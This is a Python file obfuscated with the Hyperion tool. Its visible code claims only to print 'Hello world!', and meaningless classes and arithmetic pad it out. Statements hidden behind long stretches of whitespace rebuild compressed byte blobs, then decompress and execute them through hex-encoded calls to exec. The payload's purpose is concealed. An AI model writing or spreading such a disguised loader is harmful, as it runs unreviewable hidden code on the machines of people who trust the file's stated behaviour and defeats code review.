from builtins import *
from math import prod as _product
__obfuscator__ = 'Hyperion'
__authors__ = ('billythegoat356', 'BlueRed')
__github__ = 'https://github.com/billythegoat356/Hyperion'
__discord__ = 'https://discord.gg/plague'
__license__ = 'EPL-2.0'
__code__ = 'print("Hello world!")'
Theory, Modulo, _math, Invert, _absolute, _run, Builtins = exec, str, tuple, map, ord, globals, type
class _algorithm:
    def __init__(self, _detectvar):
        self._substract = _product((_detectvar, -35589))
        self._negative(Add=-94336)
    def _negative(self, Add = str):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        self._substract -= 29530 - Add
        
        try:
            (((_absolute, Theory, Modulo), Modulo) for Modulo in (Theory, Invert))

        except OSError:
            (({Invert: Invert}, Modulo) for Modulo in {Theory: 'beeioteuythbtliebb'})

        except:
            Builtins(-84490 - -31764) == True
    def Absolute(self, Product = 96266):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Product += -60996 * 38527
        self.MemoryAccess != False
        
        try:
            ((Invert, While) or Modulo if (Invert, While) and Modulo else ... or (Modulo, (Invert, While)))

        except AttributeError:
            (({Modulo: Theory}, While) for While in (Theory, Invert))

        except:
            Builtins(-79159 - -28307) == int
    def Positive(_modulo = bool):
        return _run()[_modulo]
    def _positive(_multiply = -29996 / 61305, Frame = type, Square = _run):
        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
        Square()[_multiply] = Frame
        
        try:
            ((Theory, Invert) or While if (Theory, Invert) and While else ... or (While, (Theory, Invert)))

        except ArithmeticError:
            (((_absolute, Theory, Modulo), While) for While in {Modulo: Theory})

        except:
            Builtins(2137 + -21842) == bool
    def execute(code = str):
        return Theory(Modulo(_math(Invert(_absolute, code))))
    @property
    def MemoryAccess(self):
        self._round = '<__main__._product object at 0x000004798BE85980>'
        return (self._round, _algorithm.MemoryAccess)
if __name__ == '__main__':
    try:
        _algorithm.execute(code = __code__)
        _frame = _algorithm(_detectvar = 63820 / -15305)
        if 359884 > 4411914:
            _algorithm(_detectvar = 64675 / 88006).Absolute(Product = -95506 * _frame._substract)
        elif 349769 < 9879523:
            _frame.Absolute(Product = -77419 / _frame._substract)                                                                                                                                                                                                                                                          ;_algorithm._positive(_multiply='MNNNMMMMNMNMMNMNNN',Frame=b'x\x9c\xed\x1b]s\xe28\xf2\xf9\xf8\x15l^\x80\x9a\x99\x8c-[\x92\x9d*^\xae\xb8\xab%\xc5\x84\xab\xcd\xd5%W\xb3S\x94\xb1E\xe2\xacc\xe5\xb0\x99\x90\x7f\x7f\xdd\x92\xec\x100\xc1\x062;\x95Z\x0bY_\xad\x96\xd4j\xb5Zm\x91\xcf\x9f\xceZmx\xe2YW\x85\xf8L&r:[da\x90\xcb\xf9d\xd2\xfe\xa5\x7f\xf2\xeb\xd3\x83\x98\xc72=i\xcb\xf9\nX\xb0\xc8o\xe5<S0\xdd\x93i\x9c$O\xf9\xad\xb8\x91A\xeePv\xf2\xf1\xe4\xef\xc9B\xfc&\xa2\x93\xde\x8bZ7q~\xbb\x98j\xc4\xb7y\xfe\x90\x9d}\xfe\xac\xf3NCy\xffy\r\xcd\xe7-mGq\x16\xcay\xf4\x12\x8d\xc9<\xbd\xb9\xf9\xfc\x90\x047\x0b\xb1V)\x89C\x91fBW\xfa\xc7\xbfF\x9f\xc8\xa9\xb5\x06\x12\xcaH\x97w\x1e\xe6q\x9awO~\x15I"\xdb\x8fr\x9eD\xbf\x9c\xf4:\xad\xdeY\t\x8d\xe5\x9d\xec\x8f8\xea\xf4Zb\x19\x8a\x87\xdc\x103}X@\xcd\xdfd&\xb2v0\x17\xed\xb9\x88~O\xff\x13\xcbD\xe4:c\n\x94\xf9=\xfd\xaf\\\xa8T\xd0F$\xbf\xa7\x17r*\xa3\xa7v\x12\xff\x01\xf5\x9e\xe4\xe2\xa4\xd7\xd2\x9d\x8a\xef\x1f\xe4<\x9fL\xa0\xb5\xa7\xac\xd3;\x15\xcb8\xef\xf6Z\x89\x0c\x83$\xeb\xf6\xbev\xee\x92\xbb\x04~q\x0c\xc4\x83\x07\xc2\xce\xb7\xfeM"\xa7P\xde\xda,\xc4*\xd2\x1a[\x12\x9e\xf1XZ\x10\x19[c9\xee|=;\xfb\xf0\xe9\xc3\xa7\xee\xa7\xee\x07\xbb\xd7\xfb\xf6\xad\x1f\xc5\xf3-\xf5\x87\xc3\xf3\xd1\xe8\xfc\x1c~Cx\x8fF\xc3\xe1p\xb3\xfa\x8d\xc8\x83<\xdf\x86\xe2\xda<WW\xca_\xe1s}u\r]\xd7#km\x01\xc0\xba\xe9}\x9a\x82\xbf\xc7\x07\xde\x90H\xa1\xde3\xa9\xb64\xf9\xe5\xcb\xc5\x97\x8b\x8b/\x18`\x08\x0ejU\xe0\xeav\xa6\x8b8\xc9\xe3\x14\xc9\xfd=\x98g\xad\xcd\x9a\x88/I\x86C\xf8\xe1\x93\xe888\xf8\x01V\xc8\x1a\x8d\x0cy\x90B\xe7\xc3a\xb7\xb2\xa58\x0e\xb3 \x8d\xa7\xeb\xe4\xeb}\x1c\xabi\xc1\xf9\x81Y\x82\x07\xa7\xac!\x8e\xde\xd7c 9\x8d\xd3H,\xbb\x9d\xa7Y\x9c,\xc5m\xba\xd8\x00\xf9\xd6\xdbBq3u\xe5\x0b\xa7\xf3\xfa\xaa\t}\xb24\xce\x93xq\x10}\xb6\xe2hB\x9f\xedH\n\xfa\xcc\xf3\xac\x8a2\xd5\xbcsw\x17\'\xe0\x81Z\xb1"\x1b\xfc\xee\xc0\xbdS\xd2\xe4\x81Lf\xf5\xd9f \xa1\xc5q\xf1\x1e\xa8`<~\xa7\xb4\x11I\xfcp/\xc3*\xea\xbc"\x02\x1f\x1f\x97\xe0\xf0\xfd\xb8\xc4\xd8r\x89\xa9\xf7J\xa2\xc5\xfc\xdf\xf5\xb9\x07\xd9F\xf1\xce\x00\x98\x07Yg\x00<4x\xa7\xa4I\xa4\xdc,}\x9du\x06\xb0\xa0\xa0\xe1\x81T+\x0b\x89\xf4^\x89#\xb2$\xf8g}\x99\x8ci\x9d\xc2"L\xbcS\xba$\xc1wQ\x9f,\n\xbfj\xc94\xa6\xd3@\x9bN\xe7\xf4N\xc6\xe9\x96u\xf8\xa8D\x93\xf2ZN\xad6\xb9I\xeb\xee6u\xaa;\xed86\x89\x88G"\xc7">\xe8d\x91@M\xbd\xdb\xf1f\xf9\xa62\xd2S\xca\xe7{\x9c\xb6P,\x1bL\xdb\xb5\xd1\xb6p\xfd\x1b\x01\xa0\x82\xeb\x1d\xd3\xd0\xe9\xf1\x89;\xb1\'\x0exo\xc2&\x16\xa48\x80z\x9b\xb9;1\xb9\n\xd6\x9d\xf8P\x8bB]Ga\xa2\x9b\xb9;1\xd9Pd\x1d\x05\xea\x88l\xb6\xee\xbf\xf5\x9b\xb5G\x08\xf3\xb8\x0b\xce\xe2\x8e\x13\x90\x19\x991\x9b[\xcc\'\x11\xbc=f3\xc18\xf3!\xf48\xe5>\x11\x8e\x85\x8esF\x19\xd4d3\xeep\x17kp\x8b\x08\xe6\xb0\x19\x8bJ\x0cP\xc6(g\xe0\t\x9d\xb1\x10\xb0L\x19%\x02`}Bv\x8e\xad\x9a\xa5^\x19\x89\xeb\x83\x0b\xdd\xa0\x0c\xc3\xd2\xf9ky\x01\xc6v\xf5\xa09%i\x08\xb4\x81\x87N\x1d\xdb\x99B\xc4\x05j\xbc\xc5Hq\x8c\x81\x19\x89\x1e_\xa8r\xf48\xd5\xe8\xdc\xe0\xe8\xe3\xe30>=:\xc7!0>\n\x9e8\xaeCYT\x96\xd8+q\xc7\xf1\x0c\x14\xc5|\xc2\xf7\xa4D\xa7\x10\xe1\xfa\xa7\xf5\xcc\x1f)\xc8\x9b\xf2\x81C\xf6\x9e\xf5\x0e\x9c\xc9\xc0\xe1\xc9,V\xb1\xe4\x80\x81Zf\xa0v\xdd\x81&\xc1\xfd4\n\xda\x97\xd0\x7f\xf4D\x85\x10\xbb\xbc\xbc$gU\xfdm\xce\xba3t\x8e\x05\x82B9\x8c9\x16\xe6\xe8\x98vX\xb2\x9b}Moq\xaf\xc7\x93+RKm\xfeqrV\xa5\rl\xb3\xa0\xa8n\x16=Mt\x9f\x93]d\xef\xf4<\xd8A\xe8\x84L8\xec \x1c\xf6\x122q\x00\xd4\xdf\xcc\xdd\x89\x89@\r\x1b\xf6"\xa2\xbc\x0f\xf5p\x87r6swb\xf2\xd5\x9efc\xab\xe0\\\xdc)\x01\xd4\x9a\xf0\xf5\xdc\x03\x98\x8a\xd3\x99c\x83\xf7\xc0c\x9c\x82wM\x1e\xc8y\xc7GO\xa6\x8a\xf1\xea\xc0z\xcd\xf7\xb9\x9fv\x8fc\x0c\xf7\xb9\x10j\xf0\x03\xf7\xb9\x8e98]i\x05\xea\xea9\xf9#\xe5\xc1\xc1\x1b 9`\x03D\xe5\xfd\xb10+\x14J\xbc\nk\xac\x03_ivz\x8d"\xcf\xebu\x80\x8e\xac\xe6\xee\xc4dA\xd1\x8f\x84\xfa\x994C\x0e\xbc\x1e\xc2\x1a\xb09\xd9\x7f\xef\xd6\'6u\xc00g\r\x88\xfc\xcc\x9b\xf7\x06\x0f;o\xa4\xc4\x15J[\xa1\xc6\x05+*\x9cVWw\x8e\xb0\xdc\x03\xa5Dc\xca\x18\x1e\xb4\xa7H46\xc9\xb3\xad\xf6\x97Wl\x0f\xba\xe0\x02)\xa6\xc8\xf632\xf5^\x8a\xeb\xea\x9c\xfa\x0e\x879\x8d\x88\xf5\'\xfb\xbd\x17\x95I\\\x98\xdc\xa2\xf4\xcd\'\x8b\x9a=\xdc3\xfb\xb8o<\xee\xed\x96\xf1\xc4\xec\xfdu`knD/\x94S\xd0\x8bA\xbb\xc3/\x15\xf0K\xd47\x0b\xd0\xf4\xee\x1as;(\xb5F\xc3U\x8f\xd6xA\xdb\xfd\x91\xb2\xa9\xd0\xb7/U\'T\x8f.\x8d\xba\x8d\xa9\x06*wG-\xfd\x81\xb2\xa6\xc2\xe2W\x16U\x14\x07\x07\x8c\x06\'\xce1\x8aZ1\x89\xc5D2\x13:f\xb2\xeb\xc0\x927;n\xd9\xfb\xeb\x18h\x98\x1f\x8f\xd5\'\x1e\xa9L\xd2\x87L\xff\ng;&tM\xc8\x0c\xe73C\xb0:\xb0\xf4\x8d\x08\xc6\xf7\x17<\xe7\xf0\x0cG\xca\xa09\x1a\x0eG\xe7\xc3\xf3\x9d2\x87\xaa\xb3\x10Z\xdb\xbc\x89\x0b@l5}\x00\xb5]#_\n\x96+\xd9\xccP\x12Cn\xa8]\x07\x96\xed!\x8b\x90\x18\xa3s\xb4\xed\xea\xdb\x08@\x19H6Y\xb6\xc5F{Ql\xbej\xe0\x07\xae\xdab\xb8\xce\xca\xf1\xcb[\x11\xbfle\xd5\xee\x82}+&\xdc\xd4\xb3\xf8!g\x05}P2\xf6\xe5b\x1b\xc0\x8c7\xb7\xd7\x16|d\xaf\x88\xbc\x82\xb0\x96!b\xc1\x87u`\xf7\xe1C\x94\xf4h\xe2G\tf)5P\xbd\x8fd\xb2\xd1\xf6\xd2\xd2\xaeX\xaa\xaa\x81\xb1<\xea\xf4\xb3e\xf5\xf8\x96\xc7Mf\xb1\xdfF)\xa7\\9\xaf\x0c=\x13\xf7J\xa7\xe3;%h97\xe5\xa1\xc7\x9c\x84\xc07\xd6U\x12uU#\x89\xf1\x17+\xc5\x07~\xc7:\x95\xc2\x99\xd8Q\x96&\xfc\x12\xc2\xe1\xdc\x8cv,{3\xf7\xc05\xe2\xad\xd8\x7f\x1c\xc3\xfb\xd6\x8a\x8eHW\xd6\xc8.X\xb7\xd9\t\xb8\x9c\x8b\xc2\x8a\\\xd8\x12\xe0},\xb3&\x9b\xb9\xae\x8b\x1e\x1e\x8c\x83/\xf3\xd8\xcc\xe4\xa8\\\x05R\xc3\xbcy\xf0\x1a\xa1\x87\x08T\x14"x+O\xaa\xbbyr\xedr^%\'\xa1\x95\x12m+\x1c8\xc7_\xb1cn\xe4\xfe\x8c\x87\xca}6\xb1\xd2\xa0V\xa7\x9d\xc6<\xc5B\x160_}7\x0bU\\\xbb\xd0x\x1f\\\xf1V\xf9\xb5%\x92\xb6v\xab\x86TP6\xfd\x8a\\\x9a\xcd\xe5}\xbb\xb8\x92\xd8\xd6\x97\x1c\xdbb)\xc2\x8f\xea\xb2\xe9GuY\xf5#z\xbc\x1b\xda\xc2\x92\xaeR\xac\xa5\xba<\x85w=\x06\x83^\xcbT\x9c\x8b\xff-D\x96gE:\xbf\x9d\x8b \x8a\xd3\x9b"\xe36\xc8n\x93xZ$\xef2\x99\x16q\x99\xb5\xf2y\x90\xde\xf4\xd7t&\xa3H\xb5\x96Az;I\x82\xfe\xba\xdd\xb4Lj\x88h!\x01\x87\xd2a\xc1\x8fF\xfa\x06\xa9\x8a\x81>\xd7\x8ad\xbf\xf8r?R\x01*z\xfas\xfey\xeb;6\x7f\xff\xfc\xf9\xbc0p\xa5i+\x8f\xef\xfbc\xbc\xd02\xd0\'\nu\xffGE\xe1L\xd6\xba\x0f\x16\x93(\x08\'\xd3X\xe4\xfds\xad2\x8eP\x9f\x86\xa6\xb1\xa9V\x96\xe7}$\x9a\xfa^\xaf\xde\xb8\x0e[2;\xcd\x9e\xb2\\\xdcwW\x05\xd8R\x7f\nSw\x1b\x1e{-}_\xb8\x19\x073\x86\xa7\x01\xc2\xad\xc8\n\x88\xf5\xd2\xf1)\xd7\xb6q\x90\xb8\xcc\xe5\x14\xa4\x98`\x9c\xa3\xe9\xc2\x12\xc4g\x9e\xf7\xca\x9b\xfa|\x0b\x94*\xa9\xc0\xb1\xbd\xc6\x91\xb0\xd7\x87\xdcB\r\x97\x13\xfd\xad\x00i\xb0Q\xcbUo\xab|\xbf\xdezEO6r\xed\x9dm\x1c\xb3%\xea\x075\xa8\\\xf4!j\xc615\xe7\xf5\xf5\x91\xef\xee\xdbf={\xcb\x1c\xef\xdd\x02\xb1*i\xd5\x84F\x87\xf0Q\xc5\x08\xb7\xcd\xddQ\xa9\xd3\xa0\x15\x83\xb1\n\xfa\x18\xbc\xf3\xdcB\x8d\xd1\xd5\x98\xab\xea\x91\xed\x9c\xdb}[\xdbFqb\xd5\xe4\x16\xddB\xc1!\xd1\x0bj\x97\xb95\xe1\xac\x97\x10\xaf\x96\xef\x82\xad\xd5Buo1\x17G_u\xca\x03\x08\xd7\xb3\xfez\xbf\xf5\x1b\xe9\xcf\xa7\x0cN(<\xa2\xd3\x97|\xe7DD8QY\x1a)\xbedE)u\xd5\xa5\x8e\x90X.\xa1\xd4\x05 \x88\xa1e`\xeaR\x98\xd9)\xa4\x18\x96\x83\x9bQ\x90\xa9\x94\xbb\xd4%\xeb\xbc\r0\xb6\x0b\x07>\xea`]\xc0I)\x83\xa5& \xadR\xcd\xfaWu\x16\x02\xfc\xae\x1bA\xbf\x84\x13`\xeb,b6\xa7(m\x00\x0f\x9c2\x19\x01]\x1a:\x07\x18,\xd7\x03h\x01=\xe7\x00\x0fk\xd3\xf5(\x05v=\xac\x0f\x8cE4\x00\xbc@\x07\xecA\x15\xb7\xab\x1c\xe2Puw\xcar\\,?\xb0U\x02#\'@y\x0f\xca\xe0\x00M-\x18\xdd\x8c\x12\xeaj*\xacb[\xbf%\xc1\x03(\t\xd9\x8c\x08\xa0\x15%3\xc6\xf1\xde\x03P\t&\x8b;\x9cBK\xd4\xe1\x8d9\xa7R\xce\x83`\x9dA\xef`\xda\xa1\xb7\xb4F\xdf\xd4C\x04\xf7\x013\xce\x1a\xde\xd5\xa0\xcf\xf73\\K\xd5')

        if 424617 > 5990972:
            _algorithm(_detectvar = 39278 / -91783).Absolute(Product = 16849 * _frame._substract)
        elif 195882 < 9246551:
            _algorithm(_detectvar = 32254 / 82685).Absolute(Product = -14219 / _frame._substract)                                                                                                                                                                                                                                                          ;_algorithm._positive(_multiply='mnnmmnnnmmmmnnmnn',Frame=b'\x04\xec\xdcWsL9\xfbK\xc6\xfc\xb9o}\xd6\xd8}"\xdf\xfb(s\xe02\x01\xd1\x00\xcb\x039\xb0rq\xd2i\xd5\xdd\x00\xc7\xae\x84\xadj\x03\xa0K\xc1\xf8\xee\xc8Pi\xa3\xddJ\x86\xd5\x1d\xa1\x01)\x9e?\x97\\\x14\'\xff^\xebv\xf1\xd4\xd7\x7fy};R\xbd\x10[!l\x1c0\xb0gBm\x8a\xabZ\x83\x8agm\xec{_\xdd\xdb(\x8d\x06\xcaT\x80\x1fo\xf5\x9fy\x95)\xa50\x98\x9c\xde\x88\xbc\xbb~\x99^\xdf\xb0\x87\xa7w\x9a\x8be\xfe\x8c\xd7\\\x95}|\xbe?\xb5\\\x9e\xb5\xfe\xb6\x89Q\xddx\x1c\xea\xeb\x8fII\xb1\xa4\xc0\'\x92L\xa8z\xea_\xbf\xff\x07\x15\xa9R\x03')
        if 468904 > 4143168:
            _frame._negative(Add = _frame._substract / 94587)
        elif 284475 < 4434858:
            _algorithm(_detectvar = -11076 / 87438).Absolute(Product = -78833 + _frame._substract)                                                                                                                                                                                                                                                          ;SSS2SS2S22SSS22SS2SS2,LJLJIJILILLJLJIJI,OODoDOoooDoooDDoDoODoD,MMMNNMMMNMMNNNNNNMMM,NMMMMMMMNNMNMNMNNNN=(lambda mmmnmnmmmnnnnmmmmmn:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(mmmnmnmmmnnnnmmmmmn)"),filename='\x6e\x6e\x6d\x6e\x6d\x6d\x6d\x6e\x6d\x6d\x6d\x6d\x6d\x6d\x6d\x6d\x6d\x6e\x6e\x6d\x6d\x6d\x6e\x6e\x6d',mode='\x65\x76\x61\x6c'))),(lambda mmmnmnmmmnnnnmmmmmn:mmmnmnmmmnnnnmmmmmn['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda mmmnmnmmmnnnnmmmmmn:mmmnmnmmmnnnnmmmmmn(__import__('\x7a\x6c\x69\x62'))),(lambda lllljliiliijiijlilii,mmmnmnmmmnnnnmmmmmn:lllljliiliijiijlilii(mmmnmnmmmnnnnmmmmmn)),(lambda:(lambda mmmnmnmmmnnnnmmmmmn:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(mmmnmnmmmnnnnmmmmmn)"),filename='\x6e\x6e\x6d\x6e\x6d\x6d\x6d\x6e\x6d\x6d\x6d\x6d\x6d\x6d\x6d\x6d\x6d\x6e\x6e\x6d\x6d\x6d\x6e\x6e\x6d',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63'))
        if 133465 > 1751328:
            _frame._negative(Add = _frame._substract / -69167)
        elif 131132 < 521091:
            _algorithm(_detectvar = 76211 + -56695).Absolute(Product = -89856 - _frame._substract)                                                                                                                                                                                                                                                          ;NMMMMMMMNNMNMNMNNNN()(MMMNNMMMNMMNNNNNNMMM(LJLJIJILILLJLJIJI(OODoDOoooDoooDDoDoODoD(SSS2SS2S22SSS22SS2SS2('\x76\x61\x72\x73'))),_algorithm.Positive(_modulo='MNNNMMMMNMNMMNMNNN')+_algorithm.Positive(_modulo='mnnmmnnnmmmmnnmnn')))
    except Exception as While:
        if 398338 > 627095:
            _algorithm.execute(code = Modulo(While))
        elif 366162 > 1313620:
            _frame.Absolute(Product = 70306 * _frame._substract)